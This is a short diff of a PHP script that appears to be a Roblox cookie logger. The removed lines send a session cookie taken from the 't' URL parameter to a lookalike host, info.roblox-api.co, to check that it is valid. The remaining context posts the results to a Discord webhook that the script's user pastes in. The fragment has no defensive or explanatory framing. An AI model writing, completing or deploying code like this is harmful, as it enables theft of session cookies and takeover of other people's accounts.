@@ -2,17 +2,6 @@
 
 $wontent = htmlspecialchars($_GET['t']);
 
-$ch = curl_init("https://info.roblox-api.co/userinfo?cookie=" . $wontent); // such as http://example.com/example.xml
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-$data = curl_exec($ch);
-$data = json_decode($data);
-if ($data->emailverified == 1){
-  $email = "True";
-} else {
-  $email = "False";
-}
-if ($data->status == "good"){
     //=======================================================================================================
 // Create new webhook in your Discord channel settings and copy&paste URL
 //=======================================================================================================
@@ -174,8 +163,5 @@ curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
 
 $response = curl_exec( $ch );
 curl_close( $ch );
-} else {
-  echo("Invalid Cookie<br>");
-}
 curl_close($ch);
 ?>
